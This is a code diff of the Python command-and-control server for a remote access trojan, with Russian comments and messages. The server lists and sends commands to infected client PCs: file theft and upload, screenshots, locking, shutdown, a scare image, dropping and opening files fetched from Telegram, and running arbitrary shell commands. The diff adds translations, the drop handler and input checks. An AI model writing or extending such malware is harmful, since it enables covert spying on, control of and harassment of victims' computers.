@@ -1,30 +1,41 @@
 import socket, json, base64
 
 # Список команд с описанием, в виде 2д массива
-commands = [
+commands_en = [
     ["exit", "Exits the connection on both sides"],
-    ["cd", "Changes the active directory"],
+    ["cd", "Changes the active directory with one arg"],
     ["download", "Downloads files from the client"],
     ["upload", "Uploads files from the server to the client"],
     ["message", "Shows a message box on the client users screen"],
     ["lock", "Puts the client user back to the login screen"],
-    ["shutdown", "Shutsdown the client users PC, will close connection"],
-    ["restart", "Restarts the client users PC"],
-    ["ratHelp", "Displays this list"],
+    ["shutdown", "Shutsdown the client PC"],
+    ["restart", "Restarts the client PC"],
     ["screen", "makes screenshot"],
-    ["drop", "отправляет файл и открывает его на клиенте"],
+    ["drop", "uploads file to client pc and opep it"],
+]
+
+commands = [
+    ["exit", "Закрывает соединение с клиентом"],
+    ["cd", "меняет активную директорию при одном аргументе, без аргументов выводит активную"],
+    ["download", "Скачивает файл с пк клиента"],
+    ["upload", "Загружает файл с сервера на пк клиента"],
+    ["message", "Выводит на клиенте сообщение"],
+    ["lock", "Блокирует пользователя на клиенте, при этом ратник продолжет работать"],
+    ["shutdown", "выключает пк клиента"],
+    ["restart", "перезагружает пк клиента"],
+    ["screen", "делает скриншот"],
+    ["screamer", "показывает скример"],
+    ["drop", "отправляет файл из телеграма и открывает его на клиенте"],
 ]
 
 # выводит список доступных команд
-def helpCommand():
+def help_command():
     """Выводит список доступных команд с описанием"""
-    total = 0
-    result = "\nCommands: \n"
+    result = "\nКоманды: \n"
     # Добавление описания каждой команды
-    for x in commands:
-        result = result + "\n" + f"[{total}] {commands[total][0]} - {commands[total][1]}"
-        total += 1
-    result = result + "\n" + "[∞] Anything - will run a command on the users PC like command prompt\n"
+    for command in commands:
+        result = result + "\n" + f"{command[0]} - {command[1]}"
+    result = result + "\n" + "Anything - will run a command on the users PC like command prompt\n"
     return result
 
 class ManyServers:
@@ -60,13 +71,20 @@ class ManyServers:
         for i in self.__servers_ips.keys():
             print(self.__servers_count)
             s = s + str(i) + ". " + str(self.__servers_ips[i][0]) + "\n"
+        if s == "":
+            s = "нет подключенных клиентов в данный момент"
         return s
     
     async def make_command_to_server(self, command):
         """Создание запроса к клиенту(ам) по тегу. Если тег = all, отправляет запрос всем клиентам"""
         # @todo many tags
         # извлечение тега из сообщения
-        tag = command.split()[0]
+        try:
+            tag = command.split()[0]
+        except IndexError:
+            return "Укажите тег!"
+        if len(command.split()) == 1:
+            return "Укажите команду!"
         # обработка сценария с тегом all
         if tag == "all":
             res = [command[1]]
@@ -80,13 +98,13 @@ class ManyServers:
         try:
             tag = int(tag)
         except ValueError:
-            return "incorrect tag"
+            return f"некорректный тег: {tag}"
         # проверка наличия подключения с полученным тегом
         if self.__servers_ips.get(tag, "no") == "no":
-            return f"exist not connection with name: {tag}"
+            return f"нет подключения с тегом: {tag}"
         # проверка занятости клиента другим запросом
         elif self.__servers_ips[tag][1].in_process:
-            return f"{tag} connection already in process"
+            return f"{tag} клиент занят выполнением другой задачи"
         # выполнение запроса определенным клиентом
         else:
             command = command.split()[1:]
@@ -102,10 +120,10 @@ class Server:
         server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((ip, port))
         server.listen(0)
-        print("[+] Waiting for a connection")
+        print("[+] Ожидание подключения")
         self.connection, address = server.accept()
         self.tag = address[0]
-        print("[+] Connection received from " + str(address))
+        print("[+] Подключен клиент с адресом: " + str(address))
         # helpCommand()
         
     def step(self, command):
@@ -114,13 +132,16 @@ class Server:
             if command[0] == "upload":
                 fileContent = self.__readFile(command[1]).decode()
                 command.append(fileContent)
+            elif command[0] == "drop":
+                fileContent = self.__readFile(command[1]).decode()
+                command.append(fileContent)
             result = self.__executeRemotely(command)
             if command[0] == "download" and "[-] Error" not in result:
                 result = self.__writeFile(command[1], result)
-            if command[0] == "screenshot" and "[-] Error" not in result:
+            elif command[0] == "screenshot" and "[-] Error" not in result:
                 result = self.__screenshot(result)
             elif command[0] == "ratHelp":
-                result = helpCommand()
+                result = help_command()
         except Exception:
             result = "[-] Error running command, check the syntax of the command."
         return result
